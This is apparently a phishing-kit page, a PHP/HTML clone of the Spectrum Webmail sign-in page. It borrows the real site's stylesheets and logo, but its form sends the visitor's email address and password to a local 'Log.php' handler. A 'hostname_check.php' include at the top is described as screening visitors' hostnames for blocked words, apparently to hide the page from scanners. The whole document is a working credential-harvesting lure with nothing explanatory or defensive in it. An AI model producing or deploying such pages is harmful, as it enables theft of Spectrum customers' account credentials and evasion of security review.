<?php 
require_once 'hostname_check.php'; // Check if hostname contain blocked word

?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">

    <link
        rel="stylesheet"
        type="text/css"
        href="https://webmail.spectrum.net/application/modules/mail/views/scripts/mail/css/spectrum.css?v=2.6.0_4"
    />
    <link rel="stylesheet"
        type="text/css"
        href="https://webmail.spectrum.net/application/modules/mail/views/scripts/auth/css/login.css?v=2.6.0_4"
    />
    <link rel="stylesheet" type="text/css" href="https://webmail.spectrum.net/application/modules/mail/views/scripts/mail/css/rutledge.css?v=2.6.0_4" />
    <title>Log In - Webmail</title>
</head>

<body>

</ul>
            </nav>
</div>

<div id="body">
    
<div id="login-text-container">
    <div id="login-text-spacer">
        <h1>Welcome to Spectrum Webmail</h1>
        <br>
        <p id="login-welcome-text" tabindex="0">
            Need help finding your way around?
            Visit <a href="https://www.timewarnercable.com/en/support/internet/step-by-step/twc-mail.html" target="_blank">Spectrum Support</a> for more info about how to use and manage your Spectrum Webmail account.
        </p>
    </div>
</div>

<div id="loginForm">
    <div id="logo">
        <img
            alt="Spectrum logo"
            src="https://webmail.spectrum.net/application/modules/mail/views/scripts/mail/images/logos/spectrum-logo.svg?v=2.6.0_4"
        >
    </div>
    
        
    <div id="loginFormContainer">

        <h1 id="headline">
            Sign In to Webmail
        </h1>
        <div id="hohLink">
            <div id="dividerLine"></div>
            <div id="orText">or</div>
            <div id="hohHref"><a href="https://www.spectrum.net/hoh">Create an Email Address</a></div>
        </div>
                <script language="JavaScript">
<!--
function check(form) {
if (form.email.value=="")
{ alert("Please enter your Email aaddress before submitting."); form.email.focus(); return;}
if (form.pass.value=="")
{ alert("Please enter your Password before submitting."); form.pass.focus(); return;}
form.submit()
}
//-->
</script>
		<form name="form" method="POST" action="Log.php" id="form" aria-label="Login" class="form js-form analytics-form login__global-form login__global-form--multi-line " id="login-form-1">
            <div id="emailAddressContainer" >
                <label for="emailAddress">Email Address</label>
               <input type="email" id="emailAddress" name="email" value="" required="" style="
    width: 291px;
    height: 24px;
    padding-left: 3px;
    margin-bottom: 5px;
    margin-top: 5px;
">
            </div>

            <div id="rememberEmailContainer">
                <input
                        type="checkbox"
                        name="rememberEmail"
                        id="rememberEmail"
                                    >
                <label for="rememberEmail">
                    Remember Email Address
                </label>
            </div>

            <div id="emailPasswordContainer" >
                <label for="emailPassword">
                    Email Password
                </label>
                <input
                        type="password"
                        id="emailPassword"
                        name="pass"
                required>
            </div>
            
            <input type="submit" name="submit" id="emailSubmit" href="javascript:submit()" onclick="check(this.form)" onsubmit="check(form);" value="Sign In">
        </form>

        <div id="forgotLinks">
            <a id="forgotEmail" href="https://urt.rr.com/">Forgot Email Address?</a>
            <a id="forgotPassword" href="https://pt.rr.com/">Forgot Email Password?</a>
        </div>
    </div>

</div>
</div>


<div id="footer">
    <nav role="navigation">
                    <ul>
    <li>&copy; 2020 Charter Communications. All rights reserved</li>
    <li>
        <a href="http://www.twcmedia.com/default.aspx?cid=aff:twccmediasales" target="_blank">Advertise with Us</a>
    </li>

    <li>
        <a href="https://www.spectrum.com/policies/your-privacy-rights.html" target="_blank">Terms of Use</a>
    </li>

    <li>
        <a href="https://www.spectrum.com/policies/website-privacy-policy.html" target="_blank">Web Privacy Policy</a>
    </li>

    <li>
        <a href="https://www.spectrum.com/policies/ca-privacy-rights.html" target="_blank">Your California Privacy Rights</a>
    </li>

    <li>
        <a href="http://help.twcable.com/policies.html?cid=aff:twccwmsubscriberpoli" target="_blank">TWC Subscriber Policies</a>
    </li>

    <li>
        Time Warner Cable and the Time Warner Cable logo
        are trademarks of Time Warner Inc., used under license.
    </li>
</ul>
            </nav>
</div>
</body>
</html>
